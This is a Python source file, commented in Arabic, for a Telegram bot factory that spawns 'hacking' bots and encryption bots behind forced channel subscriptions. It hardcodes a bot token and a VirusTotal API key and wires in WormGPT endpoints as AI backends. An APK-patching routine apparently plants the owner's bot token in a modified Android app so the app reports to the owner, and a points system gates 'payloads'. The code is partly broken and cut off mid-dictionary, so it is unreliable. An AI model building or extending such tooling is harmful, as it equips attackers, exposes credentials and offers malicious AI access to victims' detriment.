#!/usr/bin/env python3.9
import logging
import os
import json
import requests
import shutil
import random
import string
import time
import urllib.parse
import base64
import threading
import zipfile
import hashlib

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
) # For simple hashing as a "cipher" example
import codecs # For rot13

# تسجيل الدخول
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# توكن البوت الرئيسي (صانع البوتات)
MAIN_BOT_TOKEN = "7329173289:AAF_wiNXiYu49pw11nmL_ujt215Nzi8iu2E"

# القنوات الأساسية للاشتراك الإجباري في البوت الرئيسي
MAIN_CHANNELS = ["@IRX_J", "@I_R_XJ"]
# قناة المصنع الأساسية التي يمكن إزالتها/إضافتها كاشتراك إجباري
FACTORY_MAIN_SUBSCRIPTION_CHANNEL = "@IRX_J"
# حالة الاشتراك الإجباري لقناة المصنع الأساسية (True: مفعل، False: معطل)
FACTORY_MAIN_SUBSCRIPTION_ENABLED = True # سيتم تحديثها ديناميكيًا

# مسار مجلد قاعدة البيانات
DATABASE_DIR = "database"
if not os.path.exists(DATABASE_DIR):
    os.makedirs(DATABASE_DIR)

# لتخزين حالة كل مستخدم في البوت الرئيسي
user_state = {}
# لتخزين البوتات التي صنعها المستخدم في البوت الرئيسي
created_bots = {} # {user_id: [{token: "...", admin_id: "...", username: "...", bot_type: "..."}, ...]}

# قائمة بالبوتات المصنوعة التي تعمل حاليًا (لإيقافها وتشغيلها)
running_made_bot_updaters = {} # {bot_username: updater_instance}

# معرف الأدمن الرئيسي
MAIN_ADMIN_ID = 1927038653 # تم إضافة معرف الأدمن الرئيسي هنا

# قائمة بمعرفات الأدمنز الإضافيين في المصنع
FACTORY_ADMINS = [MAIN_ADMIN_ID] # يمكن إضافة معرفات أخرى هنا

# --- APIs الجديدة ---
API_TEXT_TO_SPEECH = "https://sii3.moayman.top/api/voice.php"
API_AI_PRIMARY = "https://sii3.moayman.top/api/gemini-pro.php"
API_IMAGE_GENERATION_NEW = "http://sii3.moayman.top/api/img.php"
API_AI_FALLBACK_1 = "https://sii3.moayman.top/api/openai.php"
API_AI_FALLBACK_2 = "http://67f3d369ebd19.xvest5.ru/api/WormGPT.php"
API_AI_FALLBACK_3 = "http://sii3.moayman.top/DARK/api/wormgpt.php"
API_SHEREEN_AI = "http://sii3.moayman.top/api/s.php"
API_DEEPSEEK_AI = "https://sii3.moayman.top/api/deepseek.php"
API_CHATGPT_3_5 = "http://sii3.moayman.top/api/chat/gpt-3.5.php"
API_AZKAR = "http://sii3.moayman.top/api/azkar.php"

# --- VirusTotal API Key ---
VIRUSTOTAL_API_KEY = 'd851c6064844b30083483cbfa5a2001d9ac0b811a666f0110c0efb4eaab747e'

# --- توكن البوت الخاص بك الذي سيتم تشفيره داخل الـ APK ---
YOUR_BOT_TOKEN_FOR_APK = "7329173289:AAF_wiNXiYu49pw11nmL_ujt215Nzi8iu2E" # تم تغيير التوكن هنا
YOUR_ADMIN_ID_FOR_APK = 1927038653 # الأيدي الخاص بك الذي سيستقبل رسائل التطبيق

# --- مسار ملف الـ APK الأصلي ---
ORIGINAL_APK_PATH = "/home/container/app_modified_1927038653.apk"
# --- اسم الملف داخل الـ APK الذي يحتوي على التوكن (افتراضي) ---
APK_TOKEN_FILE_INSIDE = "assets/bot_token.txt" # افتراض: ملف داخل مجلد assets

# --- وظائف مساعدة عامة ---

def check_subscription(user_id, channels, bot_token):
    """يتحقق من اشتراك المستخدم في القنوات المحددة."""
    for channel in channels:
        try:
            # استخدام توكن البوت الرئيسي للتحقق من قناة المصنع الأساسية
            # هذا يضمن أن التحقق يتم دائمًا بواسطة البوت الذي يمتلك صلاحية الأدمن في القناة
            if channel == FACTORY_MAIN_SUBSCRIPTION_CHANNEL:
                resp = requests.get(f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getChatMember?chat_id={channel}&user_id={user_id}").json()
            else:
                resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel}&user_id={user_id}").json()

            if not resp.get("ok") or resp["result"]["status"] not in ["member", "administrator", "creator"]:
                return False
        except Exception as e:
            logging.error(f"Error checking subscription for {user_id} in {channel}: {e}")
            return False
    return True

def get_channel_name(channel_id, bot_token):
    """يجلب اسم القناة من معرفها."""
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={channel_id}").json()
        if resp.get("ok"):
            return resp["result"]["title"]
    except Exception as e:
        logging.error(f"Error getting channel name for {channel_id}: {e}")
    return channel_id

def send_message(bot_instance, chat_id, text, reply_markup=None, parse_mode=None):
    """دالة مساعدة لإرسال الرسائل."""
    try:
        bot_instance.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logging.error(f"Error sending message to {chat_id}: {e}")

def edit_message_text(bot_instance, chat_id, message_id, text, reply_markup=None, parse_mode=None):
    """دالة مساعدة لتعديل الرسائل."""
    try:
        bot_instance.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logging.error(f"Error editing message {message_id} in {chat_id}: {e}")

def clean_api_response(text):
    """يزيل النصوص المتعلقة بالاشتراك في القنوات من استجابات الـ API."""
    if not isinstance(text, str):
        return text

    phrases_to_remove = [
        "اشترك في قناتنا",
        "اشترك بقناتنا",
        "@DarkAIx",
        "@IRX_J",
        "@I_R_XJ",
        "Dont forget to support the channel"
    ]
    
    cleaned_text = text
    for phrase in phrases_to_remove:
        cleaned_text = cleaned_text.replace(phrase, "").strip()
    
    cleaned_text = ' '.join(cleaned_text.split())
    return cleaned_text

# --- وظائف التشفير والتعديل على الـ APK (تم استبدال دالة التشفير) ---

def encrypt_token(token: str) -> str:
    """
    يشفر التوكن بنفس طريقة التشفير المستخدمة في ملف index.py.
    """
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

def modify_apk_with_token(original_apk_path: str, encrypted_token: str, output_apk_path: str) -> bool:
    """
    يعدل ملف الـ APK بوضع التوكن المشفر الجديد بداخله.
    هذه الوظيفة تفترض أن التوكن يمكن حقنه في ملف نصي داخل مجلد assets.
    هذا قد لا يعمل إذا كان التطبيق لا يقرأ التوكن من هذا المسار أو بهذه الطريقة.
    الحل الأمثل هو استخدام apktool لفك تجميع الـ APK وتعديل الكود مباشرة.
    """
    try:
        # إنشاء نسخة مؤقتة من الـ APK الأصلي
        temp_apk_path = f"{output_apk_path}.tmp"
        shutil.copyfile(original_apk_path, temp_apk_path)

        # فتح ملف الـ APK كملف ZIP
        with zipfile.ZipFile(temp_apk_path, 'a', zipfile.ZIP_DEFLATED) as zf:
            # حذف الملف القديم إذا كان موجودًا
            try:
                zf.getinfo(APK_TOKEN_FILE_INSIDE)
                zf.writestr(APK_TOKEN_FILE_INSIDE, encrypted_token.encode()) # تحديث الملف
            except KeyError:
                # إذا لم يكن الملف موجودًا، قم بإضافته
                zf.writestr(APK_TOKEN_FILE_INSIDE, encrypted_token.encode())
        
        # نقل الملف المؤقت إلى المسار النهائي
        shutil.move(temp_apk_path, output_apk_path)
        logging.info(f"Successfully modified APK: {output_apk_path} with new token.")
        return True
    except Exception as e:
        logging.error(f"Error modifying APK file {original_apk_path}: {e}")
        return False

# --- وظائف البوت الرئيسي (صانع البوتات) ---

def get_main_bot_user_keyboard():
    """لوحة مفاتيح المستخدم العادي للبوت الرئيسي (واجهة صنع بوت جديد)."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot")],
        [InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")]
    ])

def get_main_bot_admin_keyboard():
    """لوحة مفاتيح الأدمن الرئيسي."""
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    
    sub_status_text = "✅ إزالة الاشتراك الإجباري" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "➕ إضافة الاشتراك الإجباري"
    sub_status_callback = "remove_factory_main_subscription" if FACTORY_MAIN_SUBSCRIPTION_ENABLED else "add_factory_main_subscription"

    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot"),
         InlineKeyboardButton("🛠 بوتاتك", callback_data="manage_bots")],
        [InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin"),
         InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin")],
        [InlineKeyboardButton("📊 إحصائيات المصنع", callback_data="factory_stats")],
        [InlineKeyboardButton("🛑 إيقاف جميع البوتات", callback_data="stop_all_bots"),
         InlineKeyboardButton("🟢 فتح جميع البوتات", callback_data="start_all_bots")],
        [InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots")],
        [InlineKeyboardButton(sub_status_text, callback_data=sub_status_callback)] # زر إضافة/إزالة الاشتراك الإجباري
    ])

def start_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    # Check if user is a factory admin
    if user_id in FACTORY_ADMINS:
        send_message(context.bot, user_id,
                     "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @lTF_l\nقناة المطور: @IRX_J",
                     reply_markup=get_main_bot_admin_keyboard())
        user_state[user_id] = None
        return

    # Normal user flow
    if check_subscription(user_id, MAIN_CHANNELS, MAIN_BOT_TOKEN):
        send_message(context.bot, user_id,
                     "👋 حياك الله في بوت صانع البوتات ✨\n\nالمطور: @lTF_l\nقناة المطور: @IRX_J",
                     reply_markup=get_main_bot_user_keyboard())
        user_state[user_id] = None
    else:
        msg = "❌ يجب عليك الاشتراك في القنوات التالية لاستخدام البوت:\n\n"
        for channel in MAIN_CHANNELS:
            msg += f"🔗 {channel}\n"
        msg += "\n➖➖➖➖➖➖➖➖➖➖\nبعد الاشتراك، أرسل /start مرة أخرى."
        update.message.reply_text(msg)

def create_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    keyboard = [
        [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot")],
        [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot")],
        [InlineKeyboardButton("🎩 مصنع بوتات", callback_data="create_factory_bot")] # New bot type
    ]
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "اختر نوع البوت الذي تريد إنشاءه: 👇", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[query.from_user.id] = "await_bot_type_selection"

def create_hack_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت اختراق'.")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "hack_bot"}

def create_encryption_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'بوت تشفير py'.")
    user_state[query.from_user.id] = {"action": "await_token", "bot_type": "encryption_bot"}

def create_factory_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id

    # التحقق من الاشتراك في قناة المصنع الأساسية قبل السماح بإنشاء بوت مصنع
    # هذا التحقق يتم بواسطة توكن البوت الرئيسي
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED and not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
        msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لإنشاء مصنع بوتات.\n"
        keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
        edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                          msg, reply_markup=InlineKeyboardMarkup(keyboard))
        user_state[user_id] = None
        return

    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "📝 أرسل الآن توكن البوت الذي أنشأته من BotFather لنوع 'مصنع بوتات'.")
    user_state[user_id] = {"action": "await_token", "bot_type": "factory_bot"}


def manage_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    bots = created_bots.get(user_id, [])
    if not bots:
        edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                          "⚠️ ليس لديك أي بوتات حتى الآن. أنشئ واحدًا لتبدأ! 🚀")
        return
    keyboard = []
    for bot_data in bots:
        keyboard.append([InlineKeyboardButton(f"🤖 {bot_data['username']} ({bot_data['bot_type']})", callback_data=f"info_{bot_data['username']}")])
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "اختر البوت الذي تريد إدارته من قائمتك: 👇", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[user_id] = "manage_bots"

def bot_info_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    username = query.data.split("_", 1)[1]
    keyboard = [[InlineKeyboardButton("🗑 حذف البوت", callback_data=f"delete_{username}")]]
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      f"معلومات البوت @{username} ℹ️", reply_markup=InlineKeyboardMarkup(keyboard))
    user_state[user_id] = f"confirm_delete_{username}"

def delete_bot_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    username = query.data.split("_", 1)[1]
    user_state[user_id] = f"confirm_delete_{username}"
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      f"⚠️ هل أنت متأكد من حذف البوت @{username}؟\nإذا كنت متأكد أرسل:\n`delete {username}`",
                      parse_mode=ParseMode.MARKDOWN)

def add_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if user_id != MAIN_ADMIN_ID: # Only main admin can add other factory admins
        query.answer("🚫 ليس لديك صلاحية لإضافة أدمنز للمصنع.", show_alert=True)
        return
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "الرجاء إرسال معرف (ID) المستخدم الذي تريد إضافته كأدمن للمصنع: 👨‍💻")
    user_state[user_id] = "await_new_factory_admin_id"

def remove_factory_admin_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if user_id != MAIN_ADMIN_ID: # Only main admin can remove other factory admins
        query.answer("🚫 ليس لديك صلاحية لحذف أدمنز من المصنع.", show_alert=True)
        return
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "الرجاء إرسال معرف (ID) المستخدم الذي تريد حذفه كأدمن من المصنع: 🗑️")
    user_state[user_id] = "await_remove_factory_admin_id"

def factory_stats_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    
    total_bots = sum(len(bots) for bots in created_bots.values())
    total_users_in_made_bots = 0
    for bot_username in made_bot_data:
        total_users_in_made_bots += len(made_bot_data[bot_username].get("members", []))
    
    stats_message = (
        f"📊 *إحصائيات المصنع:*\n"
        f"🤖 عدد البوتات المصنوعة: {total_bots}\n"
        f"👥 إجمالي عدد المستخدمين في البوتات المصنوعة: {total_users_in_made_bots}\n"
        f"👨‍💻 عدد الأدمنز في المصنع: {len(FACTORY_ADMINS)}"
    )
    send_message(context.bot, query.message.chat.id, stats_message, parse_mode=ParseMode.MARKDOWN)

def stop_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري إيقاف جميع البوتات... ⏳", show_alert=True)
    user_id = query.from_user.id
    
    action_taken = False
    for bot_username, updater_instance in list(running_made_bot_updaters.items()):
        try:
            updater_instance.stop()
            del running_made_bot_updaters[bot_username]
            logging.info(f"Stopped made bot @{bot_username}")
            action_taken = True
        except Exception as e:
            logging.error(f"Error stopping made bot @{bot_username}: {e}")
    
    if action_taken:
        send_message(context.bot, query.message.chat.id, "✅ تم إيقاف جميع البوتات المصنوعة بنجاح.")
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\n"
                         f"قام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإيقاف جميع البوتات المصنوعة.",
                         parse_mode=ParseMode.MARKDOWN)
    else:
        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات قيد التشغيل لإيقافها أو حدث خطأ.")

def start_all_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري إعادة تشغيل جميع البوتات... 🔄", show_alert=True)
    user_id = query.from_user.id

    action_taken = False
    # Restart made bots
    for admin_id_key, bots_list in created_bots.items():
        for bot_info in bots_list:
            bot_username = bot_info["username"]
            if bot_username not in running_made_bot_updaters:
                try:
                    updater = run_made_bot(bot_info["token"], bot_info["admin_id"], bot_username, bot_info["bot_type"])
                    if updater:
                        running_made_bot_updaters[bot_username] = updater
                        logging.info(f"Restarted made bot @{bot_username}")
                        action_taken = True
                except Exception as e:
                    logging.error(f"Error restarting made bot @{bot_username}: {e}")
    
    if action_taken:
        send_message(context.bot, query.message.chat.id, "✅ تم إعادة تشغيل جميع البوتات المصنوعة بنجاح.")
        if user_id != MAIN_ADMIN_ID:
            send_message(context.bot, MAIN_ADMIN_ID,
                         f"🔔 *إشعار للمالك:*\n"
                         f"قام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإعادة تشغيل جميع البوتات المصنوعة.",
                         parse_mode=ParseMode.MARKDOWN)
    else:
        send_message(context.bot, query.message.chat.id, "⚠️ لا توجد بوتات لإعادة تشغيلها أو حدث خطأ.")

def broadcast_free_bots_main_bot(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id

    send_message(context.bot, query.message.chat.id,
                      "الرجاء إرسال الرسالة التي تريد إذاعتها للبوتات المجانية: 📢")
    user_state[user_id] = "await_broadcast_free_bots_message"

def add_factory_main_subscription(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري تفعيل الاشتراك الإجباري لقناة المصنع...", show_alert=True)
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = True
    
    # تحديث إعدادات جميع البوتات المصنوعة
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL not in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].append(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)
    
    send_message(context.bot, query.message.chat.id, "✅ تم تفعيل الاشتراك الإجباري لقناة المصنع لجميع البوتات (الحالية والمستقبلية).")
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @lTF_l\nقناة المطور: @IRX_J",
                      reply_markup=get_main_bot_admin_keyboard())
    if query.from_user.id != MAIN_ADMIN_ID:
        send_message(context.bot, MAIN_ADMIN_ID,
                     f"🔔 *إشعار للمالك:*\nقام الأدمن [{query.from_user.first_name}](tg://user?id={query.from_user.id}) بتفعيل الاشتراك الإجباري لقناة المصنع.",
                     parse_mode=ParseMode.MARKDOWN)

def remove_factory_main_subscription(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer("جاري إزالة الاشتراك الإجباري لقناة المصنع...", show_alert=True)
    global FACTORY_MAIN_SUBSCRIPTION_ENABLED
    FACTORY_MAIN_SUBSCRIPTION_ENABLED = False

    # تحديث إعدادات جميع البوتات المصنوعة
    for bot_username in made_bot_data:
        load_made_bot_settings(bot_username)
        if FACTORY_MAIN_SUBSCRIPTION_CHANNEL in made_bot_data[bot_username]["channels"]:
            made_bot_data[bot_username]["channels"].remove(FACTORY_MAIN_SUBSCRIPTION_CHANNEL)
            save_made_bot_settings(bot_username)

    send_message(context.bot, query.message.chat.id, "✅ تم إزالة الاشتراك الإجباري لقناة المصنع من جميع البوتات (الحالية والمستقبلية).")
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "👋 حياك الله في بوت صانع البوتات (وضع الأدمن) ✨\n\nالمطور: @lTF_l\nقناة المطور: @IRX_J",
                      reply_markup=get_main_bot_admin_keyboard())
    if query.from_user.id != MAIN_ADMIN_ID:
        send_message(context.bot, MAIN_ADMIN_ID,
                     f"🔔 *إشعار للمالك:*\nقام الأدمن [{query.from_user.first_name}](tg://user?id={query.from_user.id}) بإزالة الاشتراك الإجباري لقناة المصنع.",
                     parse_mode=ParseMode.MARKDOWN)

def handle_message_main_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    state = user_state.get(user_id)
    text = update.message.text.strip()
    
    if isinstance(state, dict) and state.get("action") == "await_token":
        send_message(context.bot, update.message.chat.id, "⏳ جاري إعداد البوت، يرجى الانتظار... 🚀")
        bot_token = text
        bot_type = state["bot_type"]
        try:
            bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
            if not bot_info_resp.get("ok"):
                send_message(context.bot, update.message.chat.id, "❌ التوكن غير صالح. يرجى التأكد من صحة التوكن وإعادة المحاولة.")
                user_state[user_id] = None
                return

            bot_username = bot_info_resp["result"]["username"]
            
            bots = created_bots.get(user_id, [])
            bots.append({"token": bot_token, "admin_id": user_id, "username": bot_username, "bot_type": bot_type})
            created_bots[user_id] = bots

            bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
            with open(bot_data_file, 'w') as f:
                json.dump({"token": bot_token, "admin_id": user_id, "bot_type": bot_type}, f)

            send_message(context.bot, update.message.chat.id, f"✅ تم تشغيل البوت @{bot_username} بنجاح! 🎉")
            user_state[user_id] = None
            
            # Send notification to MAIN_ADMIN_ID
            if user_id != MAIN_ADMIN_ID: # Avoid notifying admin about their own bot creation
                creator_name = update.effective_user.first_name
                creator_username = update.effective_user.username
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار: تم إنشاء بوت جديد!* 🔔\n\n"
                             f"👤 *بواسطة:* [{creator_name}](tg://user?id={user_id}) (@{creator_username})\n"
                             f"🤖 *اسم البوت:* @{bot_username} (نوع: {bot_type})\n"
                             f"🔗 *رابط البوت:* t.me/{bot_username}",
                             parse_mode=ParseMode.MARKDOWN)

            updater = run_made_bot(bot_token, user_id, bot_username, bot_type)
            if updater: # Only add to running_made_bot_updaters if updater started successfully
                running_made_bot_updaters[bot_username] = updater

        except Exception as e:
            logging.error(f"Error setting up bot with token {bot_token}: {e}")
            send_message(context.bot, update.message.chat.id, "❌ حدث خطأ أثناء إعداد البوت. يرجى المحاولة مرة أخرى.")
            user_state[user_id] = None
        return

    if state and state.startswith("confirm_delete_"):
        username_to_delete = state.split("_", 2)[2]
        
        if text == f"delete {username_to_delete}":
            # Find the bot_type before deleting
            bot_type_to_delete = None
            for bots_list in created_bots.values():
                for bot_data in bots_list:
                    if bot_data["username"] == username_to_delete:
                        bot_type_to_delete = bot_data["bot_type"]
                        break
                if bot_type_to_delete:
                    break

            bots = created_bots.get(user_id, [])
            created_bots[user_id] = [b for b in bots if b["username"] != username_to_delete]
            
            bot_data_file = os.path.join(DATABASE_DIR, f"{username_to_delete}.json")
            if os.path.exists(bot_data_file):
                os.remove(bot_data_file)
            
            bot_made_data_dir = os.path.join(DATABASE_DIR, f"{username_to_delete}_settings.json")
            if os.path.exists(bot_made_data_dir):
                os.remove(bot_made_data_dir)

            if username_to_delete in running_made_bot_updaters:
                running_made_bot_updaters[username_to_delete].stop()
                del running_made_bot_updaters[username_to_delete]

            user_state[user_id] = None
            send_message(context.bot, update.message.chat.id, f"✅ تم حذف البوت @{username_to_delete} من المصنع بنجاح! 🗑️")
        else:
            send_message(context.bot, update.message.chat.id, "❌ أمر الحذف غير صحيح. يرجى المحاولة مرة أخرى.")
        user_state[user_id] = None
        return

    if user_id in FACTORY_ADMINS:
        if state == "await_new_factory_admin_id":
            try:
                new_admin_id = int(text)
                if new_admin_id not in FACTORY_ADMINS:
                    FACTORY_ADMINS.append(new_admin_id)
                    send_message(context.bot, update.message.chat.id, f"✅ تم إضافة المستخدم {new_admin_id} كأدمن جديد للمصنع. 👨‍💻")
                    send_message(context.bot, new_admin_id, "تهانينا! 🎉 لقد تم إضافتك كأدمن في بوت المصنع. أرسل /start للوصول إلى لوحة التحكم. 🚀")
                    if user_id != MAIN_ADMIN_ID:
                        send_message(context.bot, MAIN_ADMIN_ID,
                                     f"🔔 *إشعار للمالك:*\n"
                                     f"قام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإضافة أدمن جديد: [{new_admin_id}](tg://user?id={new_admin_id}).",
                                     parse_mode=ParseMode.MARKDOWN)
                else:
                    send_message(context.bot, update.message.chat.id, "هذا المستخدم هو أدمن بالفعل. ℹ️")
                user_state[user_id] = None
            except ValueError:
                send_message(context.bot, update.message.chat.id, "❌ معرف المستخدم غير صالح. الرجاء إرسال رقم صحيح.")
            return

        if state == "await_remove_factory_admin_id":
            try:
                admin_to_remove_id = int(text)
                if admin_to_remove_id == MAIN_ADMIN_ID:
                    send_message(context.bot, update.message.chat.id, "❌ لا يمكن حذف المالك الرئيسي للمصنع.")
                elif admin_to_remove_id in FACTORY_ADMINS:
                    FACTORY_ADMINS.remove(admin_to_remove_id)
                    send_message(context.bot, update.message.chat.id, f"✅ تم حذف المستخدم {admin_to_remove_id} كأدمن من المصنع. 🗑️")
                    send_message(context.bot, admin_to_remove_id, "لقد تم إزالتك من قائمة أدمنز المصنع. 😔")
                    if user_id != MAIN_ADMIN_ID:
                        send_message(context.bot, MAIN_ADMIN_ID,
                                     f"🔔 *إشعار للمالك:*\n"
                                     f"قام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بحذف الأدمن: [{admin_to_remove_id}](tg://user?id={admin_to_remove_id}).",
                                     parse_mode=ParseMode.MARKDOWN)
                else:
                    send_message(context.bot, update.message.chat.id, "هذا المستخدم ليس أدمنًا في المصنع. ℹ️")
                user_state[user_id] = None
            except ValueError:
                send_message(context.bot, update.message.chat.id, "❌ معرف المستخدم غير صالح. الرجاء إرسال رقم صحيح.")
            return

        if state == "await_broadcast_free_bots_message":
            broadcast_message = text
            sent_count = 0
            failed_count = 0
            
            for admin_id_key, bots_list in created_bots.items():
                for bot_info in bots_list:
                    bot_username = bot_info["username"]
                    load_made_bot_settings(bot_username)
                    bot_settings = made_bot_data[bot_username]
                    
                    if bot_settings["payment_status"] == "free":
                        # Get the bot's actual updater instance
                        updater_instance = running_made_bot_updaters.get(bot_username)
                        if updater_instance:
                            bot_instance = updater_instance.bot
                            members = bot_settings["members"]
                            for member_id in members:
                                try:
                                    send_message(bot_instance, member_id, broadcast_message)
                                    sent_count += 1
                                except Exception as e:
                                    logging.warning(f"Could not send broadcast to {member_id} in bot @{bot_username}: {e}")
                                    failed_count += 1
                        else:
                            logging.warning(f"Bot @{bot_username} is not running, skipping broadcast.")

            send_message(context.bot, update.message.chat.id,
                         f"✅ تم إرسال الإذاعة إلى البوتات المجانية.\n"
                         f"عدد الرسائل المرسلة بنجاح: {sent_count} 🚀\n"
                         f"عدد الرسائل الفاشلة: {failed_count} 💔")
            user_state[user_id] = None
            if user_id != MAIN_ADMIN_ID:
                send_message(context.bot, MAIN_ADMIN_ID,
                             f"🔔 *إشعار للمالك:*\n"
                             f"قام الأدمن [{update.effective_user.first_name}](tg://user?id={user_id}) بإذاعة رسالة للبوتات المجانية.\n"
                             f"الرسائل المرسلة بنجاح: {sent_count}, الفاشلة: {failed_count}.",
                             parse_mode=ParseMode.MARKDOWN)
            return


# --- وظائف البوتات المصنوعة (لوحة التحكم والإدارة) ---

# تخزين حالة المستخدمين في البوتات المصنوعة
bot_user_states = {}
# تخزين آخر وقت تفاعل للمستخدم في البوتات المصنوعة
user_last_interaction_time = {}

# بيانات البوتات المصنوعة (سيتم تحميلها من ملفات JSON)
# {bot_username: {
#   "channels": [],
#   "notifications": "off",
#   "bot_status": "on",
#   "payment_status": "free",
#   "paid_users": [],
#   "banned_users": [],
#   "members": [],
#   "additional_check_channel": "@IRX_J",
#   "start_message": "**مرحبًا! بك كل الازرار مجاناً:**",
#   "rembo_state": None # Temporary state for admin actions
#   "features_channel": None # New field for features channel
#   "points": 0, # New field for points
#   "referred_users": [], # New field to track referred users
#   "payload_points_required": 30 # New field for payload points
#   "custom_buttons": [] # New field for custom buttons
#   "custom_buttons_enabled_by_admin": False # New field to enable custom buttons
#   "bot_type": "hack_bot" # New field to distinguish bot types
#   "main_channel_link": None # New field for encryption bot's main channel
#   "parent_factory_admin_id": None # New field to store the admin ID of the parent factory
#   "factory_sub_admins": [] # New field for sub-factory admins
# }}
made_bot_data = {}

DEFAULT_BOT_SETTINGS = {
    "channels": [FACTORY_MAIN_SUBSCRIPTION_CHANNEL] if FACTORY_MAIN_SUBSCRIPTION_ENABLED else [], # تحديث بناءً على حالة الاشتراك الإجباري للمصنع
    "notifications": "off",
    "bot_status": "on",
    "payment_status": "free",
    "banned_users": [],
    "members": [],
    "additional_check_channel": "@IRX_J", # هذا قد يكون قناة المصنع الأساسية أو قناة أخرى
    "start_message": "**مرحبًا! بك كل الازرار مجاناً:**",
    "rembo_state": None,
    "features_channel": None, # Default for new features channel
